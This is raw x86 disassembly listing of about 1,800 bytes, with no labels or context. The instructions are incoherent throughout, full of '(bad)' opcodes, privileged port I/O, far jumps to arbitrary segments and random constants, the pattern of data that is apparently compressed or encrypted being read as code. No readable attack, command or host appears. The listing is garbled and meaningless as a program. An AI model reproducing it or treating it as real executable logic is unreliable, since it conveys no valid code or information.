  411be1:	adc    BYTE PTR [ebp+0x38],dh
  411be4:	xrelease mov BYTE PTR [ecx+0xcc2b0cb],bh
  411beb:	pop    edx
  411bec:	jb     0x411be7
  411bee:	and    eax,0x8a0911ae
  411bf3:	loope  0x411ba1
  411bf5:	ss sbb ebp,esp
  411bf8:	jp     0x411c3e
  411bfa:	sub    eax,0x8e7e1667
  411bff:	push   eax
  411c00:	mov    edx,0x1f21ed2
  411c05:	pop    ebx
  411c06:	(bad)  [edi+0x6f]
  411c09:	xchg   esi,eax
  411c0a:	inc    DWORD PTR [ebx+0x7a]
  411c0d:	ds push ebp
  411c0f:	add    bh,BYTE PTR [edi+0x1e]
  411c12:	fisttp QWORD PTR [ebx-0x30]
  411c15:	fadd   st,st(3)
  411c17:	js     0x411c84
  411c19:	jb     0x411c37
  411c1b:	mov    dh,0x85
  411c1d:	or     ah,BYTE PTR [eax+0x8]
  411c20:	mov    al,ds:0x7f4d3df3
  411c25:	nop
  411c26:	jae    0x411c4c
  411c28:	lock mov ch,0x17
  411c2b:	shl    BYTE PTR [edi+0x4dbf4dc0],1
  411c31:	repnz push DWORD PTR [ebp-0x34b3ab5]
  411c38:	mov    al,0xa9
  411c3a:	fstp   TBYTE PTR [edi+ecx*4]
  411c3d:	mov    bl,BYTE PTR [esi]
  411c3f:	dec    edi
  411c40:	(bad)  
  411c41:	pop    ebx
  411c42:	arpl   WORD PTR [edi-0xbffc53],bx
  411c48:	sbb    bl,BYTE PTR [esi+0x47]
  411c4b:	xor    DWORD PTR [esi+0x52],0x52
  411c4f:	dec    edx
  411c50:	mov    esi,ebp
  411c52:	popa   
  411c53:	push   cs
  411c54:	inc    ecx
  411c55:	(bad)  
  411c57:	std    
  411c58:	fsubr  DWORD PTR [ecx-0x11]
  411c5b:	xor    eax,0x2ddc348f
  411c60:	loop   0x411cae
  411c62:	mov    bh,0xaa
  411c64:	push   0xffffffa2
  411c66:	sar    DWORD PTR [edi-0xa],0xcc
  411c6a:	mov    ecx,0x8bbd3c48
  411c6f:	fwait
  411c70:	mov    ds:0x950c5bf1,eax
  411c75:	addr16 (bad) 
  411c77:	aam    0xfc
  411c79:	or     eax,0x65de3e0b
  411c7e:	out    dx,eax
  411c7f:	sub    eax,esi
  411c81:	aad    0x87
  411c83:	cmc    
  411c84:	leave  
  411c85:	xchg   ecx,eax
  411c86:	adc    cl,BYTE PTR [ebp-0x2750d212]
  411c8c:	mov    WORD PTR [eax-0x52],fs
  411c8f:	aad    0x69
  411c91:	xchg   esi,eax
  411c92:	dec    esp
  411c93:	dec    edi
  411c94:	jno    0x411cc1
  411c96:	dec    ebx
  411c97:	jp     0x411c77
  411c99:	add    BYTE PTR [esp+edx*2+0x41d7c6a8],al
  411ca0:	(bad)  
  411ca1:	lahf   
  411ca2:	jne    0x411c27
  411ca4:	ins    BYTE PTR es:[edi],dx
  411ca5:	sysenter 
  411ca7:	mov    ds:0x2d8e9ffc,eax
  411cac:	jo     0x411c42
  411cae:	and    BYTE PTR [edx+0x309c20a2],bl
  411cb4:	shr    ch,0x1d
  411cb7:	xor    dl,dh
  411cb9:	pop    ecx
  411cba:	out    dx,al
  411cbb:	jl     0x411c9f
  411cbd:	sahf   
  411cbe:	clc    
  411cbf:	fsubr  st(3),st
  411cc1:	sar    DWORD PTR [ebx-0x69ffb51d],0xf4
  411cc8:	imul   esp,DWORD PTR [ecx],0x59558ede
  411cce:	je     0x411c97
  411cd0:	add    al,0x86
  411cd2:	arpl   WORD PTR [edx+0x15],bp
  411cd5:	pop    ebp
  411cd6:	inc    edx
  411cd7:	mov    edx,0xf64941e1
  411cdc:	push   ecx
  411cdd:	pop    eax
  411cde:	xchg   DWORD PTR [ecx+0x752ff900],ecx
  411ce4:	int    0xca
  411ce6:	lods   al,BYTE PTR ds:[esi]
  411ce7:	cmp    BYTE PTR [ebp-0x36],cl
  411cea:	xor    dh,BYTE PTR [eax+0x7eb577d4]
  411cf0:	loop   0x411d3f
  411cf2:	aad    0x5d
  411cf4:	fst    QWORD PTR [esp+edx*8]
  411cf7:	cmp    al,0x34
  411cf9:	idiv   DWORD PTR [eax+ebp*2-0x31]
  411cfd:	mov    ?,WORD PTR [edi+esi*2+0x10ccf87b]
  411d04:	cmc    
  411d05:	xor    ecx,DWORD PTR [esi-0x21]
  411d08:	add    ah,BYTE PTR [ebp-0x300a128a]
  411d0e:	jl     0x411d64
  411d10:	mov    ebp,0xed221ddd
  411d15:	adc    bl,ah
  411d17:	mov    edx,DWORD PTR [edi+eiz*8-0x6afbcce0]
  411d1e:	js     0x411d8a
  411d20:	jmp    0x411d71
  411d22:	jmp    0x5222:0xb1b72abe
  411d29:	es inc esp
  411d2b:	outs   dx,DWORD PTR ds:[esi]
  411d2c:	mov    eax,ds:0x35004f67
  411d31:	dec    ebp
  411d32:	in     eax,dx
  411d33:	(bad)  
  411d34:	fmul   DWORD PTR [edx-0x32]
  411d37:	inc    edx
  411d38:	fcomp  DWORD PTR [ebx-0x56]
  411d3b:	loop   0x411d0f
  411d3d:	loopne 0x411d49
  411d3f:	xchg   ebp,eax
  411d40:	repz mov al,0x47
  411d43:	daa    
  411d44:	dec    edx
  411d45:	(bad)  
  411d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d47:	test   al,0x30
  411d49:	bound  edi,QWORD PTR [esi+eiz*8-0x7509295]
  411d50:	push   ecx
  411d51:	push   ss
  411d52:	or     DWORD PTR [edx+0x7d32563b],edx
  411d58:	sbb    ecx,DWORD PTR [eax-0x6ec35aa9]
  411d5e:	push   cs
  411d5f:	or     edi,DWORD PTR [edx]
  411d61:	xlat   BYTE PTR ds:[ebx]
  411d62:	push   0x59243702
  411d67:	cmp    dh,BYTE PTR [esi-0x2b]
  411d6a:	xchg   edx,eax
  411d6b:	pcmpgtw mm4,QWORD PTR [edi-0x27]
  411d6f:	retf   
  411d70:	push   ecx
  411d71:	neg    edi
  411d73:	ret    0xd39e
  411d76:	lods   al,BYTE PTR ds:[esi]
  411d77:	add    ah,BYTE PTR [esi+edx*1+0x4edca96a]
  411d7e:	and    al,dl
  411d80:	sub    eax,0xccafc1b2
  411d85:	ins    DWORD PTR es:[edi],dx
  411d86:	test   eax,0x543d7ce6
  411d8b:	sbb    ebx,esp
  411d8d:	cld    
  411d8e:	cs ret 
  411d90:	dec    BYTE PTR [esi]
  411d92:	jg     0x411db2
  411d94:	push   ds
  411d95:	sub    DWORD PTR [edx],edi
  411d97:	pop    esp
  411d98:	shr    DWORD PTR ss:[edx],0x7a
  411d9c:	leave  
  411d9d:	mov    cl,0x26
  411d9f:	pop    edi
  411da0:	mov    dl,0x34
  411da2:	xor    dl,BYTE PTR [edx+0x61]
  411da5:	jmp    0xd88a4a70
  411daa:	test   al,0x4b
  411dac:	in     eax,0xcc
  411dae:	cmp    eax,0x5dea1b9a
  411db3:	cwde   
  411db4:	jns    0x411deb
  411db6:	lods   eax,DWORD PTR ds:[esi]
  411db7:	adc    edx,ebp
  411db9:	jb     0x411d46
  411dbb:	push   edx
  411dbc:	or     BYTE PTR [ebx-0x6671646d],dl
  411dc2:	fst    DWORD PTR [edi]
  411dc4:	into   
  411dc5:	mov    esi,0x248fba5b
  411dca:	lahf   
  411dcb:	xchg   ebx,eax
  411dcc:	not    BYTE PTR [esp+ebx*8]
  411dcf:	and    BYTE PTR [esi],ch
  411dd1:	ja     0x411dd9
  411dd3:	mov    dh,0x6d
  411dd5:	je     0x411e42
  411dd7:	dec    esi
  411dd8:	add    al,0x85
  411dda:	push   esi
  411ddb:	jne    0x411e14
  411ddd:	clc    
  411dde:	in     eax,0xa3
  411de0:	or     al,0xf3
  411de2:	xchg   ebx,eax
  411de3:	idiv   BYTE PTR [ecx+0x4e1570bf]
  411de9:	jo     0x411da1
  411deb:	sbb    al,0x48
  411ded:	inc    ecx
  411dee:	test   BYTE PTR [ecx+0x29cce019],0x3c
  411df5:	ror    edx,1
  411df7:	fidiv  DWORD PTR [ecx-0x24693e24]
  411dfd:	adc    eax,0x22b3ccba
  411e02:	cmp    bl,cl
  411e04:	sub    eax,0x18820f5f
  411e09:	lahf   
  411e0a:	xor    ecx,DWORD PTR [eax+0x28]
  411e0d:	clc    
  411e0e:	push   0xffffff85
  411e10:	es push esi
  411e12:	pusha  
  411e13:	outs   dx,BYTE PTR ds:[esi]
  411e14:	sub    dh,ch
  411e16:	stc    
  411e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e18:	popf   
  411e19:	inc    edx
  411e1a:	fsubr  st,st(7)
  411e1c:	and    BYTE PTR [ebx],dh
  411e1e:	push   esi
  411e1f:	retf   0x3af8
  411e22:	int    0x33
  411e24:	and    DWORD PTR [esi-0x15],esp
  411e27:	fnsave [eax]
  411e29:	mov    al,0xed
  411e2b:	mov    cl,0xad
  411e2d:	sti    
  411e2e:	cmp    BYTE PTR [ecx-0x1dd02fb5],0xbc
  411e35:	dec    edi
  411e36:	push   0xe
  411e38:	sahf   
  411e39:	xchg   ebx,eax
  411e3a:	inc    esi
  411e3b:	push   cs
  411e3c:	sub    eax,0x94ac38fd
  411e41:	cli    
  411e42:	mov    bh,BYTE PTR ds:0xea62d0c8
  411e48:	dec    ebx
  411e49:	add    BYTE PTR [eax+0x42],0xb4
  411e4d:	enter  0x4fd2,0xf1
  411e51:	clc    
  411e52:	cmp    ebp,eax
  411e54:	or     cl,BYTE PTR [ebp+0x6981836f]
  411e5a:	xchg   edi,eax
  411e5b:	dec    edi
  411e5c:	les    edx,FWORD PTR [edi+edi*1+0x322b3cd7]
  411e63:	test   DWORD PTR cs:[esi],ebx
  411e66:	inc    esp
  411e67:	ret    0x3194
  411e6a:	jmp    0x411e81
  411e6c:	xchg   DWORD PTR [ecx-0x6cbca78],eax
  411e72:	ror    BYTE PTR [edx-0x2b],cl
  411e75:	sub    al,0xac
  411e77:	ret    
  411e78:	fsub   st,st(6)
  411e7a:	adc    DWORD PTR [edi+edi*4+0x5ddad92e],0xffffffef
  411e82:	or     ah,BYTE PTR [eax]
  411e84:	mov    al,BYTE PTR [edx-0x2a90718d]
  411e8a:	pop    edi
  411e8b:	inc    edi
  411e8c:	push   es
  411e8d:	ins    BYTE PTR es:[edi],dx
  411e8e:	fdiv   st,st(2)
  411e90:	sbb    bh,BYTE PTR [edx+0x7f]
  411e93:	inc    eax
  411e94:	adc    eax,0x833d99f6
  411e99:	and    al,0x6d
  411e9b:	out    0x21,al
  411e9d:	sti    
  411e9e:	adc    BYTE PTR [ebx-0x2a1a8624],dl
  411ea4:	ins    BYTE PTR es:[edi],dx
  411ea5:	fstp   QWORD PTR [ecx+0x7]
  411ea8:	fxsave [ecx+edx*2+0x69611240]
  411eb0:	ficomp WORD PTR [ecx-0x1]
  411eb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eb4:	push   edx
  411eb5:	cwde   
  411eb6:	dec    ebx
  411eb7:	xchg   ebx,eax
  411eb8:	dec    edx
  411eb9:	jae    0x411f37
  411ebb:	cmp    al,BYTE PTR [eax-0x72a6832c]
  411ec1:	push   esp
  411ec2:	inc    esi
  411ec3:	dec    ecx
  411ec4:	sbb    eax,DWORD PTR [ebp+edi*4-0x3624b557]
  411ecb:	pop    edx
  411ecc:	mov    edi,0x3afa78cf
  411ed1:	and    DWORD PTR [ebp-0x73657b44],0xffffff97
  411ed8:	sub    BYTE PTR [eax+ebx*1],dl
  411edb:	arpl   WORD PTR [edx-0x4e6415e5],ax
  411ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ee2:	das    
  411ee3:	test   eax,0x649063c6
  411ee8:	xor    al,0xfe
  411eea:	mov    edx,DWORD PTR [edi+eiz*4-0x58]
  411eee:	push   esi
  411eef:	fmul   QWORD PTR [esp+ecx*1]
  411ef2:	icebp  
  411ef3:	pop    es
  411ef4:	icebp  
  411ef5:	push   esi
  411ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ef7:	cmp    DWORD PTR [edx+0x22],ebx
  411efa:	inc    esp
  411efb:	jno    0x411f74
  411efd:	dec    ecx
  411efe:	sbb    eax,eax
  411f00:	mov    cl,0x9a
  411f02:	mov    eax,0x28173de6
  411f07:	shr    DWORD PTR [ebx+edx*1],cl
  411f0a:	inc    ebp
  411f0b:	adc    ebp,DWORD PTR [edi+eax*1+0x29]
  411f0f:	pop    ebp
  411f10:	pop    ds
  411f11:	adc    eax,0x8d69a942
  411f16:	push   ss
  411f17:	mov    cl,0x39
  411f19:	sti    
  411f1a:	jmp    0x411eb4
  411f1c:	or     al,0xc4
  411f1e:	in     eax,0x5e
  411f20:	ret    
  411f21:	out    0xf,eax
  411f23:	aam    0x5a
  411f25:	int    0x61
  411f27:	clc    
  411f28:	and    eax,0xf73760a6
  411f2d:	jns    0x411f2d
  411f2f:	sbb    ah,bh
  411f31:	sbb    ecx,DWORD PTR [edi+0x7f6c1434]
  411f37:	inc    ebx
  411f38:	jo     0x411f53
  411f3a:	retf   
  411f3b:	jle    0x411f67
  411f3d:	sti    
  411f3e:	retf   
  411f3f:	mov    dl,0xbb
  411f41:	adc    al,0x3f
  411f43:	arpl   WORD PTR [edx-0x4d63db6f],dx
  411f49:	mov    ch,0x6e
  411f4b:	pop    edx
  411f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f4d:	int    0x99
  411f4f:	push   esi
  411f50:	aam    0xb0
  411f52:	mov    ds:0xdf079029,al
  411f57:	(bad)  
  411f58:	xchg   ebp,eax
  411f59:	jno    0x411f83
  411f5b:	mov    ch,0x16
  411f5d:	jbe    0x411fc5
  411f5f:	jmp    0x617d:0xa79bf0ce
  411f66:	and    eax,0x7960fcaf
  411f6b:	xchg   ecx,eax
  411f6c:	icebp  
  411f6d:	les    eax,FWORD PTR [ebp+esi*4-0x794d34e0]
  411f74:	pmulhuw mm4,QWORD PTR [ebx]
  411f77:	jmp    0xe1de:0x560beca6
  411f7e:	int    0x48
  411f80:	inc    edx
  411f81:	leave  
  411f82:	sbb    al,0xc7
  411f84:	and    al,0x9b
  411f86:	out    dx,al
  411f87:	jge    0x411f8a
  411f89:	inc    ebp
  411f8a:	mov    bh,BYTE PTR [ebx+ecx*1+0x516b790a]
  411f91:	sub    al,0x78
  411f93:	arpl   WORD PTR ds:0x7f506e31,di
  411f99:	jbe    0x411ffe
  411f9b:	mov    cl,0x66
  411f9d:	sar    BYTE PTR [edx-0x72],cl
  411fa0:	es and ebx,edx
  411fa3:	fsubr  st(5),st
  411fa5:	les    ecx,FWORD PTR [eax+0x65bbf50]
  411fab:	das    
  411fac:	mov    ecx,0x8776ae5b
  411fb1:	jns    0x411f7e
  411fb3:	cld    
  411fb4:	(bad)  
  411fb5:	sahf   
  411fb6:	inc    BYTE PTR [ebp+0x30]
  411fb9:	dec    edx
  411fba:	push   ds
  411fbb:	in     al,0x20
  411fbd:	pop    edi
  411fbe:	lahf   
  411fbf:	xchg   ebp,eax
  411fc0:	mov    eax,ds:0xeeeb9e87
  411fc5:	aas    
  411fc6:	mov    eax,ds:0x1540d069
  411fcb:	mov    al,0x80
  411fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fce:	sub    eax,0x70ce82d3
  411fd3:	cdq    
  411fd4:	out    dx,eax
  411fd5:	sbb    ah,BYTE PTR [eax-0x757af102]
  411fdb:	sub    BYTE PTR [edx+0x4a9bd3d3],0xbb
  411fe2:	(bad)  
  411fe3:	xor    eax,0xa5db7ee5
  411fe8:	mov    ah,BYTE PTR [ecx-0x487bcf13]
  411fee:	daa    
  411fef:	fcmovnbe st,st(2)
  411ff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ff2:	scas   eax,DWORD PTR es:[edi]
  411ff3:	push   0xffffff9d
  411ff5:	outs   dx,BYTE PTR ds:[esi]
  411ff6:	mov    dl,0x55
  411ff8:	mov    edx,0x218b3944
  411ffd:	sub    al,0x49
  411fff:	imul   dh
  412001:	mov    esp,0x3de585f3
  412006:	cmp    eax,0xe5f9679
  41200b:	jge    0x412010
  41200d:	sub    dx,ax
  412010:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412011:	sub    al,0x4
  412013:	imul   ecx,esp,0x263abd22
  412019:	dec    eax
  41201a:	idiv   BYTE PTR [eax-0x2a]
  41201d:	push   ebx
  41201e:	out    0x9c,al
  412020:	clc    
  412021:	inc    edx
  412022:	pop    ecx
  412023:	mov    ebx,0xb3cd7763
  412028:	ss sti 
  41202a:	dec    eax
  41202b:	std    
  41202c:	mov    dl,0x1e
  41202e:	xor    DWORD PTR [eax-0x5626be5a],0x70
  412035:	dec    eax
  412036:	dec    esi
  412037:	jnp    0x411fc7
  412039:	sbb    BYTE PTR ss:[edx+0x5b0133ea],bh
  412040:	cwde   
  412041:	inc    eax
  412042:	mov    dl,0xee
  412044:	ja     0x412035
  412046:	aam    0xce
  412048:	sub    al,0xbf
  41204a:	jmp    0x7a75fac5
  41204f:	pop    edi
  412050:	cwde   
  412051:	sti    
  412052:	fwait
  412053:	xchg   edi,eax
  412054:	gs stc 
  412056:	cwde   
  412057:	mov    ss,WORD PTR [ecx-0x43]
  41205a:	aam    0xc9
  41205c:	adc    DWORD PTR [ebx],ecx
  41205e:	inc    ecx
  41205f:	add    al,0x42
  412061:	push   esp
  412062:	add    dl,BYTE PTR [edi-0x1f]
  412065:	in     eax,dx
  412066:	ss std 
  412068:	pop    eax
  412069:	(bad)  
  41206a:	xor    al,0x18
  41206c:	xchg   ebp,eax
  41206d:	pop    ss
  41206e:	mov    ebx,0x78761060
  412073:	fs jbe 0x412023
  412076:	adc    BYTE PTR [edi+0x2cd1447e],dl
  41207c:	jne    0x412071
  41207e:	mov    ch,0x54
  412080:	inc    edx
  412081:	xor    eax,0x6b19cb4d
  412086:	sbb    dl,bl
  412088:	clc    
  412089:	mov    BYTE PTR [esi+0x375d78af],dh
  41208f:	jb     0x412012
  412091:	rol    cl,cl
  412093:	std    
  412094:	sar    BYTE PTR [ebp-0x47b45270],0xbb
  41209b:	pop    eax
  41209c:	mov    bl,0x57
  41209e:	adc    al,0x41
  4120a0:	pop    edi
  4120a1:	std    
  4120a2:	in     al,dx
  4120a3:	les    edi,FWORD PTR [edi-0x7e9661fa]
  4120a9:	ds dec ebp
  4120ab:	cld    
  4120ac:	mov    WORD PTR [edi+edx*8+0x78],es
  4120b0:	out    dx,al
  4120b1:	hlt    
  4120b2:	mov    edi,0xa1cd1e05
  4120b7:	loope  0x41204a
  4120b9:	(bad)  
  4120ba:	sbb    DWORD PTR [ecx],edx
  4120bc:	lods   eax,DWORD PTR ds:[esi]
  4120bd:	out    0x56,al
  4120bf:	jnp    0x41205a
  4120c1:	cwde   
  4120c2:	jbe    0x41208d
  4120c4:	scas   eax,DWORD PTR es:[edi]
  4120c5:	vcmpsd xmm2,xmm3,QWORD PTR [edi-0xffdf66c],0x49
  4120ce:	fidivr DWORD PTR [ecx]
  4120d0:	fld    QWORD PTR [eax+0x3a]
  4120d3:	pop    edx
  4120d4:	popa   
  4120d5:	loopne 0x4120be
  4120d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120d8:	push   cs
  4120d9:	jns    0x41206e
  4120db:	je     0x41209c
  4120dd:	inc    edx
  4120de:	fbstp  TBYTE PTR [eax-0x35243c68]
  4120e4:	hlt    
  4120e5:	pop    ds
  4120e6:	sbb    al,0x69
  4120e8:	fist   WORD PTR [ecx]
  4120ea:	repz es xchg ecx,eax
  4120ed:	aas    
  4120ee:	pop    eax
  4120ef:	add    eax,0x4f3cbbd0
  4120f4:	dec    ebx
  4120f5:	pop    ss
  4120f6:	popf   
  4120f7:	inc    eax
  4120f8:	ret    
  4120f9:	xchg   ebx,eax
  4120fa:	sti    
  4120fb:	and    eax,0x7852250c
  412100:	mov    ebx,?
  412102:	int3   
  412103:	out    0x3e,eax
  412105:	call   0x637aff32
  41210a:	add    eax,0x5d9b58c6
  41210f:	data16 cmp bl,bh
  412112:	jecxz  0x412133
  412114:	repz shr bh,cl
  412117:	bound  ebx,QWORD PTR ds:0x5b45ea6b
  41211d:	je     0x41215f
  41211f:	cmp    al,0x5e
  412121:	mov    al,ds:0x2a15eaef
  412126:	mov    BYTE PTR [esi-0x77fd1c7],dl
  41212c:	dec    edx
  41212d:	push   ebx
  41212e:	ss test eax,0x8604f898
  412134:	jecxz  0x4121a0
  412136:	inc    eax
  412137:	mov    gs,WORD PTR [ebp-0x7d]
  41213a:	mov    al,0x8a
  41213c:	addr16 mov edx,0xd3667d07
  412142:	lods   eax,DWORD PTR ds:[esi]
  412143:	and    dh,dl
  412145:	loop   0x412134
  412147:	xchg   edi,eax
  412148:	mov    eax,0x13d5fc10
  41214d:	mov    ds:0xa1754bc4,eax
  412152:	xor    al,BYTE PTR [edi+0x28743bc4]
  412158:	add    BYTE PTR [ebx-0x2b6da7a6],0x0
  41215f:	jmp    0xacf1a2e2
  412164:	test   BYTE PTR [edx+0x11be4fd5],0x67
  41216b:	jns    0x412197
  41216d:	das    
  41216e:	dec    DWORD PTR [esi]
  412170:	jns    0x412107
  412172:	int3   
  412173:	push   esi
  412174:	inc    edx
  412175:	clc    
  412176:	mov    edx,0xdab7b3b2
  41217b:	mov    esp,0xc34b6efc
  412180:	jno    0x41218d
  412182:	leave  
  412183:	into   
  412184:	sub    al,0x4b
  412186:	inc    esp
  412187:	hlt    
  412188:	loopne 0x412160
  41218a:	stos   DWORD PTR es:[edi],eax
  41218b:	adc    BYTE PTR [ebx],0xfd
  41218e:	mov    bh,0x5d
  412190:	jp     0x412146
  412192:	mov    ebp,0xf603f39a
  412197:	fcmovnb st,st(7)
  412199:	inc    ecx
  41219a:	je     0x4121cc
  41219c:	pusha  
  41219d:	pop    eax
  41219e:	(bad)  
  41219f:	mov    eax,0xbbefc93e
  4121a4:	and    ebx,DWORD PTR [edi-0x37]
  4121a7:	test   al,0x50
  4121a9:	data16 xor dl,BYTE PTR [edx+0x221e8336]
  4121b0:	push   0x64f2d678
  4121b5:	arpl   WORD PTR cs:[ebp+0x38],si
  4121b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121ba:	jmp    0xd438efc
  4121bf:	int3   
  4121c0:	dec    edi
  4121c1:	sub    DWORD PTR [ebx-0x75],eax
  4121c4:	ins    DWORD PTR es:[edi],dx
  4121c5:	ss test eax,0x9eed180c
  4121cb:	xor    al,BYTE PTR ds:0xbdeed72
  4121d1:	and    eax,0x733bc56e
  4121d6:	dec    esp
  4121d7:	sbb    BYTE PTR ds:0xeb13ec14,bl
  4121dd:	xchg   BYTE PTR [edx],ah
  4121df:	sbb    eax,0x7f29fc8
  4121e4:	xor    eax,0x2477d018
  4121e9:	dec    esp
  4121ea:	lahf   
  4121eb:	ror    DWORD PTR [esi+0x5e],cl
  4121ee:	ins    DWORD PTR es:[edi],dx
  4121ef:	out    0x5,eax
  4121f1:	mov    ds:0x3245bf60,eax
  4121f6:	daa    
  4121f7:	or     ecx,DWORD PTR [edi-0x7b]
  4121fa:	pop    esp
  4121fb:	adc    BYTE PTR [ecx-0x1c],bl
  4121fe:	pop    edx
  4121ff:	pop    ss
  412200:	push   eax
  412201:	test   BYTE PTR [edx+0x6e],ch
  412204:	cmp    al,0xe2
  412206:	js     0x4121ee
  412208:	ja     0x4121f4
  41220a:	dec    ebx
  41220b:	jmp    0x412217
  41220d:	cmp    DWORD PTR [ebp+0x6bce24d0],0xffffffac
  412214:	add    edi,DWORD PTR [ebp-0x5d73a7ce]
  41221a:	(bad)  
  41221c:	test   DWORD PTR [ecx+0x194b59c2],edi
  412222:	inc    edx
  412223:	arpl   WORD PTR [edi+0x43],ax
  412226:	or     DWORD PTR [ecx],eax
  412228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412229:	or     bh,ch
  41222b:	push   ss
  41222c:	cmovnp ecx,DWORD PTR [ecx-0x2d7eaf49]
  412233:	stos   BYTE PTR es:[edi],al
  412234:	or     al,0x10
  412236:	jp     0x4121dc
  412238:	scas   al,BYTE PTR es:[edi]
  412239:	inc    edi
  41223a:	pop    edi
  41223b:	sbb    eax,0x9c6c17f3
  412240:	jne    0x4122b6
  412242:	mov    ecx,0xdfe20f6b
  412247:	sub    eax,0x3faa44ed
  41224c:	inc    esi
  41224d:	(bad)  
  41224e:	xchg   ecx,eax
  41224f:	ds add eax,edx
  412252:	arpl   di,si
  412254:	push   ecx
  412255:	xor    BYTE PTR [ebx-0x316a43e3],0xe7
  41225c:	retf   
  41225d:	inc    ebx
  41225e:	push   ss
  41225f:	clc    
  412260:	repz icebp 
  412262:	mov    al,0xa5
  412264:	call   0x61df:0x72cf13fb
  41226b:	inc    ecx
  41226c:	mov    dl,0x7e
  41226e:	dec    esp
  41226f:	pop    edi
  412270:	retf   
  412271:	dec    ebx
  412272:	mov    BYTE PTR ds:0xbda510d2,al
  412278:	mov    ch,0xc6
  41227a:	or     ch,0xf
  41227d:	rcr    DWORD PTR [esi+0x11a7e6cd],0xab
  412284:	nop
  412285:	xchg   ecx,eax
  412286:	dec    ecx
  412287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412288:	jp     0x4122e5
  41228a:	aaa    
  41228b:	imul   ecx,DWORD PTR [edx],0x7cbbb7e4
  412291:	test   esi,ebx
  412293:	fdivp  st(2),st
  412295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412296:	fs dec ebx
  412298:	xor    eax,0x35c64462
  41229d:	inc    esp
  41229e:	loopne 0x4122d8
  4122a0:	mov    dh,0x10
  4122a2:	mov    ecx,0x6ddbd871
  4122a7:	jmp    0x412303
  4122a9:	push   edi
  4122aa:	and    al,0x69
  4122ac:	(bad)
  4122af:	push   ss
  4122b0:	outs   dx,DWORD PTR ds:[esi]
  4122b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122b3:	in     al,dx
  4122b4:	loope  0x4122bd
  4122b6:	arpl   WORD PTR [esp+edi*2-0x6795b652],di
  4122bd:	cli    
  4122be:	in     eax,0x7a
  4122c0:	fist   WORD PTR [edx+eax*4+0x2d]
  4122c4:	ror    edi,0xb
  4122c7:	mov    ds:0xee5ce89b,al
  4122cc:	sbb    esp,ebp
  4122ce:	adc    DWORD PTR [ecx+0x47],eax
  4122d1:	sti    
  4122d2:	aaa    
  4122d3:	inc    ebp
  4122d4:	jecxz  0x412297
  4122d6:	outs   dx,BYTE PTR ds:[esi]
  4122d7:	fnsave [ebp-0x41]
  4122da:	dec    ebp
  4122db:	test   al,0x61
  4122dd:	bound  edx,QWORD PTR [edi+0x4651adf3]
  4122e3:	pop    ss
  4122e4:	jl     0x4122f7
  4122e6:	icebp  
  4122e7:	not    BYTE PTR [eax+0x77]
  4122ea:	mov    ch,0xea
  4122ec:	(bad)  
  4122ed:	in     eax,0x6
  4122ef:	popf   
  4122f0:	call   DWORD PTR [ebx-0xe]
  4122f3:	jl     0x41230a
  4122f5:	sub    edi,DWORD PTR [eax]
  4122f7:	dec    edi
  4122f8:	and    al,0x1b
  4122fa:	daa    
  4122fb:	adc    dh,BYTE PTR [eax-0x32]
  4122fe:	(bad)  
  4122ff:	xchg   esi,eax
  412300:	sub    edi,DWORD PTR [ebx-0x981adc0]
  412306:	or     DWORD PTR [edi-0x2bb0bb37],ebx
  41230c:	dec    edx
  41230d:	repz pop ss
  41230f:	leave  
  412310:	pop    ds
  412311:	add    BYTE PTR [edx+0x6cf6b19e],0xe6
  412318:	(bad)  
  412319:	fistp  WORD PTR [esi]
  41231b:	cmp    BYTE PTR [edx+0x26],dl
  41231e:	sbb    BYTE PTR [edi+edx*1],ch
  412321:	pop    esi
  412322:	aaa    
  412323:	sub    al,0xb9
  412325:	imul   edi,edi,0xd4df63d5
  41232b:	push   edi
  41232c:	push   ss
  41232d:	xor    al,0x69
  41232f:	test   BYTE PTR [eax+ebp*8-0x35],ch
  412333:	inc    ecx
  412334:	sti    
  412335:	(bad)  
  412336:	scas   al,BYTE PTR es:[edi]
  412337:	or     BYTE PTR [esi+edx*4],0x91
  41233b:	sub    DWORD PTR [edi+0x7a7db6cc],ebx
  412341:	(bad)  
  412342:	or     bl,ah
  412344:	ss adc dl,al
  412347:	pop    ds
  412348:	or     DWORD PTR gs:[esi],0x3cb4be12
  41234f:	mov    al,0xe8
  412351:	sbb    al,0xb5
  412353:	inc    ecx
  412354:	sub    eax,0x1031b47d
  412359:	mov    edx,0xf7a48151
  41235e:	and    DWORD PTR [ecx-0x3c974cd8],ebp
  412364:	loop   0x4122f2
  412366:	ss cdq 
  412368:	sbb    ecx,edx
  41236a:	popa   
  41236b:	inc    edi
  41236c:	dec    edi
  41236d:	scas   al,BYTE PTR es:[edi]
  41236e:	bound  eax,QWORD PTR [esp+eiz*8-0x7bca46b8]
  412375:	xchg   ebp,eax
  412376:	inc    ecx
  412377:	jo     0x4122fd
  412379:	ins    DWORD PTR es:[edi],dx
  41237a:	and    eax,0x5d2a331c
  41237f:	push   eax
  412380:	mov    esp,0x928ec345
  412385:	xchg   DWORD PTR [esp+ebp*4+0x5e225be1],ecx
  41238c:	(bad)
  41238f:	popa   
  412390:	fs mov esp,0x86b4962a
  412396:	inc    edi
  412397:	icebp  
  412398:	inc    esi
  412399:	dec    esp
  41239a:	inc    ecx
  41239b:	aam    0x55
  41239d:	(bad)  
  41239e:	cmp    ah,BYTE PTR [esi+0x1f27df53]
  4123a4:	sbb    al,0x58
  4123a6:	jle    0x41234c
  4123a8:	add    cl,cl
  4123aa:	sbb    al,0x3f
  4123ac:	(bad)  
  4123ad:	pushf  
